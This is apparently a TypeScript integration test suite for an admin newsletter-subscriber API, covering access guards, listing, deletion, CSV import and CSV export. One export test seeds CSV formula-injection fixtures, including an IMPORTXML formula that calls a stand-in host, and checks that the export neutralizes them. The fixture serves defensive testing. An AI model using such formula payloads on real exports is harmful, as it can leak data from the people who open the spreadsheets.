import { randomUUID } from 'node:crypto'
import { eq } from 'drizzle-orm'
import { NextRequest } from 'next/server'
import { beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('@/lib/db/client', () => import('@/test/integration/db'))
vi.mock('next/headers', () => import('@/test/integration/session'))

import { GET as exportGet } from '@/app/api/printing-press/subscribers/export/route'
import { POST as importPost } from '@/app/api/printing-press/subscribers/import/route'
import {
  DELETE as deleteSubscriber,
  GET as listGet,
} from '@/app/api/printing-press/subscribers/route'
import { signSession } from '@/lib/auth/jwt'
import { parseCsv } from '@/lib/csv'
import {
  emailSends,
  emailSuppressions,
  logins,
  type NewSubscriber,
  subscribers,
} from '@/lib/db/schema'
import { db, resetDb } from '@/test/integration/db'
import { clearSessionStore, setSessionCookie } from '@/test/integration/session'

const BASE = 'http://localhost/api/printing-press/subscribers'

function listRequest(qs = '') {
  return new NextRequest(`${BASE}${qs}`)
}

function deleteRequest(body: unknown) {
  return new NextRequest(BASE, {
    method: 'DELETE',
    body: JSON.stringify(body),
  })
}

function importRequest(csv: string) {
  return new NextRequest(`${BASE}/import`, { method: 'POST', body: csv })
}

async function signInAs(email: string) {
  setSessionCookie(await signSession({ uuid: randomUUID(), email, name: null }))
}

const signInAsAdmin = () => signInAs('admin@example.com')

async function seedSubscriber(values: NewSubscriber) {
  const [row] = await db.insert(subscribers).values(values).returning()
  return row
}

async function subscriberByEmail(email: string) {
  const rows = await db
    .select()
    .from(subscribers)
    .where(eq(subscribers.email, email))
  return rows[0]
}

beforeEach(async () => {
  clearSessionStore()
  await resetDb()
})

describe('admin guard', () => {
  it('returns 403 on every handler when no session cookie is set', async () => {
    const responses = await Promise.all([
      listGet(listRequest()),
      deleteSubscriber(deleteRequest({ uuid: randomUUID() })),
      importPost(importRequest('email\na@example.com\n')),
      exportGet(),
    ])
    for (const res of responses) {
      expect(res.status).toBe(403)
      expect(await res.json()).toEqual({ error: 'Forbidden' })
    }
  })

  it('returns 403 on every handler for a signed-in non-admin', async () => {
    await signInAs('user@example.com')
    const responses = await Promise.all([
      listGet(listRequest()),
      deleteSubscriber(deleteRequest({ uuid: randomUUID() })),
      importPost(importRequest('email\na@example.com\n')),
      exportGet(),
    ])
    for (const res of responses) {
      expect(res.status).toBe(403)
    }
    // The rejected import must not have touched the database.
    expect(await db.select().from(subscribers)).toHaveLength(0)
  })
})

describe('GET list', () => {
  it('returns rows newest-first with pagination metadata', async () => {
    await signInAsAdmin()
    await seedSubscriber({
      email: 'alice@example.com',
      name: 'Alice',
      source: 'https://news.ycombinator.com',
    })
    await seedSubscriber({ email: 'bob@example.com' })
    await seedSubscriber({ email: 'carol@other.org', confirmedAt: new Date() })

    const res = await listGet(listRequest())
    expect(res.status).toBe(200)
    const json = await res.json()
    expect(json.total).toBe(3)
    expect(json.offset).toBe(0)
    expect(json.limit).toBe(50)
    expect(json.rows.map((r: { email: string }) => r.email)).toEqual([
      'carol@other.org',
      'bob@example.com',
      'alice@example.com',
    ])
    const alice = json.rows[2]
    expect(alice).toMatchObject({
      email: 'alice@example.com',
      name: 'Alice',
      confirmedAt: null,
      subscribedPostcard: true,
      subscribedContraption: true,
      subscribedWorkshop: true,
      source: 'https://news.ycombinator.com',
    })
    expect(alice.uuid).toMatch(/^[0-9a-f-]{36}$/)
    expect(typeof alice.createdAt).toBe('string')
    expect(json.rows[0].confirmedAt).not.toBeNull()
    // Rows without attribution carry an explicit null, not undefined.
    expect(json.rows[1].source).toBeNull()
  })

  it('filters by case-insensitive email substring via q', async () => {
    await signInAsAdmin()
    await seedSubscriber({ email: 'alice@example.com' })
    await seedSubscriber({ email: 'bob@example.com' })
    await seedSubscriber({ email: 'carol@other.org' })

    const byDomain = await (await listGet(listRequest('?q=example.com'))).json()
    expect(byDomain.total).toBe(2)
    expect(byDomain.rows.map((r: { email: string }) => r.email)).toEqual([
      'bob@example.com',
      'alice@example.com',
    ])

    const byName = await (await listGet(listRequest('?q=ALICE'))).json()
    expect(byName.total).toBe(1)
    expect(byName.rows[0].email).toBe('alice@example.com')
  })

  it('paginates with offset', async () => {
    await signInAsAdmin()
    await seedSubscriber({ email: 'alice@example.com' })
    await seedSubscriber({ email: 'bob@example.com' })
    await seedSubscriber({ email: 'carol@other.org' })

    const res = await listGet(listRequest('?offset=2'))
    const json = await res.json()
    expect(json.total).toBe(3)
    expect(json.offset).toBe(2)
    expect(json.rows).toHaveLength(1)
    expect(json.rows[0].email).toBe('alice@example.com')
  })

  it('carries suppression state (when and why) on affected rows only', async () => {
    await signInAsAdmin()
    await seedSubscriber({ email: 'fine@example.com' })
    await seedSubscriber({ email: 'gone@example.com' })
    const suppressedAt = new Date('2026-06-10T14:03:00.000Z')
    await db.insert(emailSuppressions).values({
      email: 'gone@example.com',
      reason: 'BOUNCE',
      source: 'ses_suppression_list',
      createdAt: suppressedAt,
    })

    const json = await (await listGet(listRequest())).json()
    expect(json.total).toBe(2)

    const gone = json.rows.find(
      (r: { email: string }) => r.email === 'gone@example.com'
    )
    expect(gone.suppressedAt).toBe(suppressedAt.toISOString())
    expect(gone.suppressionReason).toBe('BOUNCE')

    const fine = json.rows.find(
      (r: { email: string }) => r.email === 'fine@example.com'
    )
    expect(fine.suppressedAt).toBeNull()
    expect(fine.suppressionReason).toBeNull()
  })
})

describe('DELETE', () => {
  it('returns 400 when uuid is missing', async () => {
    await signInAsAdmin()
    const res = await deleteSubscriber(deleteRequest({}))
    expect(res.status).toBe(400)
    expect(await res.json()).toEqual({ error: 'uuid is required' })
  })

  it('returns 400 (not 500) for a malformed JSON body', async () => {
    await signInAsAdmin()
    const res = await deleteSubscriber(
      new NextRequest(BASE, { method: 'DELETE', body: 'not json' })
    )
    expect(res.status).toBe(400)
    expect(await res.json()).toEqual({ error: 'Invalid request body' })
  })

  it('returns 404 for an unknown uuid', async () => {
    await signInAsAdmin()
    const res = await deleteSubscriber(deleteRequest({ uuid: randomUUID() }))
    expect(res.status).toBe(404)
    expect(await res.json()).toEqual({ error: 'Not found' })
  })

  it('hard-deletes the subscriber along with their logins and email_sends', async () => {
    await signInAsAdmin()
    const target = await seedSubscriber({ email: 'target@example.com' })
    const other = await seedSubscriber({ email: 'other@example.com' })
    const future = new Date(Date.now() + 60_000)
    await db.insert(logins).values([
      {
        subscriberId: target.id,
        token: 'token-target',
        tokenType: 'code',
        expiredAt: future,
      },
      {
        subscriberId: other.id,
        token: 'token-other',
        tokenType: 'magic_link',
        expiredAt: future,
      },
    ])
    await db.insert(emailSends).values([
      { subscriberId: target.id, postSlug: 'some-post' },
      { subscriberId: other.id, postSlug: 'some-post' },
    ])

    const res = await deleteSubscriber(deleteRequest({ uuid: target.uuid }))
    expect(res.status).toBe(200)
    expect(await res.json()).toEqual({ ok: true })

    const remainingSubscribers = await db.select().from(subscribers)
    expect(remainingSubscribers.map((s) => s.email)).toEqual([
      'other@example.com',
    ])
    const remainingLogins = await db.select().from(logins)
    expect(remainingLogins.map((l) => l.token)).toEqual(['token-other'])
    const remainingSends = await db.select().from(emailSends)
    expect(remainingSends.map((s) => s.subscriberId)).toEqual([other.id])
  })
})

describe('POST import', () => {
  it('creates subscribed + confirmed rows from an email-only CSV', async () => {
    await signInAsAdmin()
    const res = await importPost(
      importRequest('email\na@example.com\nb@example.com\n')
    )
    expect(res.status).toBe(200)
    expect(await res.json()).toEqual({
      created: 2,
      updated: 0,
      skipped: 0,
      total: 2,
    })

    const rows = await db.select().from(subscribers)
    expect(rows).toHaveLength(2)
    for (const row of rows) {
      expect(row.subscribedPostcard).toBe(true)
      expect(row.subscribedContraption).toBe(true)
      expect(row.subscribedWorkshop).toBe(true)
      expect(row.confirmedAt).not.toBeNull()
      expect(row.source).toBe('csv_import')
    }
  })

  it('counts re-imported rows as updated but preserves opt-outs (absent flag columns)', async () => {
    await signInAsAdmin()
    const csv = 'email\na@example.com\nb@example.com\n'
    await importPost(importRequest(csv))

    // a@ opts out of workshop between imports.
    await db
      .update(subscribers)
      .set({ subscribedWorkshop: false })
      .where(eq(subscribers.email, 'a@example.com'))

    const res = await importPost(importRequest(csv))
    expect(await res.json()).toEqual({
      created: 0,
      updated: 2,
      skipped: 0,
      total: 2,
    })

    const a = await subscriberByEmail('a@example.com')
    expect(a.subscribedWorkshop).toBe(false) // opt-out preserved
    expect(a.subscribedPostcard).toBe(true)
    expect(a.subscribedContraption).toBe(true)
  })

  it('overwrites flags on existing rows when the CSV has explicit flag columns', async () => {
    await signInAsAdmin()
    await seedSubscriber({
      email: 'a@example.com',
      subscribedPostcard: false,
      subscribedContraption: true,
      subscribedWorkshop: false,
      confirmedAt: new Date(),
    })

    const res = await importPost(
      importRequest(
        'email,name,postcard,contraption,workshop,confirmed\n' +
          'a@example.com,Alice,true,false,yes,1\n'
      )
    )
    expect(await res.json()).toEqual({
      created: 0,
      updated: 1,
      skipped: 0,
      total: 1,
    })

    const a = await subscriberByEmail('a@example.com')
    expect(a.name).toBe('Alice')
    expect(a.subscribedPostcard).toBe(true)
    expect(a.subscribedContraption).toBe(false)
    expect(a.subscribedWorkshop).toBe(true)
    expect(a.confirmedAt).not.toBeNull()
  })

  it('keeps confirmation monotonic: a blank confirmed cell cannot un-confirm', async () => {
    await signInAsAdmin()
    await seedSubscriber({
      email: 'a@example.com',
      confirmedAt: new Date(),
    })

    const res = await importPost(
      importRequest('email,confirmed\na@example.com,\nnew@example.com,\n')
    )
    expect(await res.json()).toEqual({
      created: 1,
      updated: 1,
      skipped: 0,
      total: 2,
    })

    const a = await subscriberByEmail('a@example.com')
    expect(a.confirmedAt).not.toBeNull() // still confirmed
    const fresh = await subscriberByEmail('new@example.com')
    expect(fresh.confirmedAt).toBeNull() // blank cell = false for new rows
  })

  it('skips malformed rows and ignores blank lines', async () => {
    await signInAsAdmin()
    const res = await importPost(
      importRequest('email\nnot-an-email\n\nvalid@example.com\n')
    )
    expect(await res.json()).toEqual({
      created: 1,
      updated: 0,
      skipped: 1,
      total: 1,
    })
    expect(await db.select().from(subscribers)).toHaveLength(1)
  })

  it('returns 400 for a header-only CSV', async () => {
    await signInAsAdmin()
    const res = await importPost(importRequest('email\n'))
    expect(res.status).toBe(400)
    expect(await res.json()).toEqual({
      error: 'CSV needs a header row and at least one data row.',
    })
  })

  it('returns 400 when the email column is missing', async () => {
    await signInAsAdmin()
    const res = await importPost(importRequest('name\nAlice\n'))
    expect(res.status).toBe(400)
    expect(await res.json()).toEqual({
      error: 'CSV must have an "email" column.',
    })
  })

  it('stores a provided source on new rows, csv_import when the cell is blank', async () => {
    await signInAsAdmin()
    const res = await importPost(
      importRequest(
        'email,source\n' +
          'a@example.com,https://example.org/\n' +
          'b@example.com,\n'
      )
    )
    expect(await res.json()).toEqual({
      created: 2,
      updated: 0,
      skipped: 0,
      total: 2,
    })

    expect((await subscriberByEmail('a@example.com')).source).toBe(
      'https://example.org/'
    )
    expect((await subscriberByEmail('b@example.com')).source).toBe('csv_import')
  })

  it('backfills source on csv_import rows but never overwrites a captured referrer', async () => {
    await signInAsAdmin()
    await seedSubscriber({
      email: 'imported@example.com',
      source: 'csv_import',
      subscribedWorkshop: false,
    })
    await seedSubscriber({
      email: 'organic@example.com',
      source: 'https://news.ycombinator.com/',
    })

    const res = await importPost(
      importRequest(
        'email,source\n' +
          'imported@example.com,https://example.org/\n' +
          'organic@example.com,https://example.org/\n'
      )
    )
    expect(await res.json()).toEqual({
      created: 0,
      updated: 2,
      skipped: 0,
      total: 2,
    })

    const imported = await subscriberByEmail('imported@example.com')
    expect(imported.source).toBe('https://example.org/')
    expect(imported.subscribedWorkshop).toBe(false) // opt-out preserved

    const organic = await subscriberByEmail('organic@example.com')
    expect(organic.source).toBe('https://news.ycombinator.com/')
  })
})

describe('GET export', () => {
  it('returns a CSV with formula-leading cells neutralized', async () => {
    await signInAsAdmin()
    await seedSubscriber({
      email: '=cmd@example.com',
      name: '=SUM(A1:A2)',
      source: '=IMPORTXML("http://evil.test","//a")',
      confirmedAt: new Date(),
    })
    await seedSubscriber({
      email: 'plain@example.com',
      name: 'Plain Name',
      source: 'https://example.org/',
      subscribedPostcard: false,
    })

    const res = await exportGet()
    expect(res.status).toBe(200)
    expect(res.headers.get('Content-Type')).toBe('text/csv; charset=utf-8')
    expect(res.headers.get('Content-Disposition')).toMatch(
      /^attachment; filename="subscribers-\d{4}-\d{2}-\d{2}\.csv"$/
    )

    const parsed = parseCsv(await res.text())
    expect(parsed[0]).toEqual([
      'email',
      'name',
      'postcard',
      'contraption',
      'workshop',
      'confirmed',
      'source',
      'created_at',
    ])
    const data = parsed.slice(1)
    expect(data).toHaveLength(2)

    // Newest first: plain@ was inserted second.
    expect(data[0][0]).toBe('plain@example.com')
    expect(data[0][1]).toBe('Plain Name')
    expect(data[0][2]).toBe('false')
    expect(data[0][5]).toBe('false')
    expect(data[0][6]).toBe('https://example.org/')

    // Untrusted cells starting with '=' get a leading apostrophe — source is
    // attacker-influenced (it comes from document.referrer).
    expect(data[1][0]).toBe("'=cmd@example.com")
    expect(data[1][1]).toBe("'=SUM(A1:A2)")
    expect(data[1][5]).toBe('true')
    expect(data[1][6]).toBe(`'=IMPORTXML("http://evil.test","//a")`)
  })

  it('import -> export -> import round-trip preserves flags and sources without creating rows', async () => {
    await signInAsAdmin()
    await importPost(
      importRequest(
        'email,name,postcard,contraption,workshop,confirmed,source\n' +
          'rt1@example.com,One,true,false,true,true,https://example.org/\n' +
          'rt2@example.com,,false,true,false,false,\n'
      )
    )

    const exported = await (await exportGet()).text()
    const res = await importPost(importRequest(exported))
    expect(await res.json()).toEqual({
      created: 0,
      updated: 2,
      skipped: 0,
      total: 2,
    })

    const rt1 = await subscriberByEmail('rt1@example.com')
    expect(rt1.name).toBe('One')
    expect(rt1.subscribedPostcard).toBe(true)
    expect(rt1.subscribedContraption).toBe(false)
    expect(rt1.subscribedWorkshop).toBe(true)
    expect(rt1.confirmedAt).not.toBeNull()
    expect(rt1.source).toBe('https://example.org/')

    const rt2 = await subscriberByEmail('rt2@example.com')
    expect(rt2.name).toBeNull()
    expect(rt2.subscribedPostcard).toBe(false)
    expect(rt2.subscribedContraption).toBe(true)
    expect(rt2.subscribedWorkshop).toBe(false)
    expect(rt2.confirmedAt).toBeNull()
    expect(rt2.source).toBe('csv_import')
  })
})
